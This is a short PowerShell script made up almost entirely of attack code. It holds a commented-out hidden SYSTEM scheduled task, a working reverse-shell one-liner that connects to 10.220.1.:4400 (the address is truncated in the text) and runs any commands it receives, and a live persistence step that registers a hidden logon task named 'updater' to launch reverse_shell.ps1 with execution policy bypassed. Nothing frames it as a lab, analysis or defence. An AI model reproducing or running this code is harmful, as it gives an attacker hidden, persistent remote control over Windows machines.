#$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Path\To\script.ps1"
#$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
#Register-ScheduledTask -TaskName "MySilentTask" -Action $Action -Trigger $Trigger -RunLevel Highest -User "SYSTEM"

#Shell script one-liner
$client = New-Object System.Net.Sockets.TCPClient('10.220.1.',4400);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Persistence via Scheduled Task (hidden from normal user view)
$task = "schtasks /create /sc onlogon /tn updater /tr 'powershell -w hidden -ExecutionPolicy Bypass -File `"%USERPROFILE%\Documents\reverse_shell.ps1`"' /f"
Invoke-Expression $task
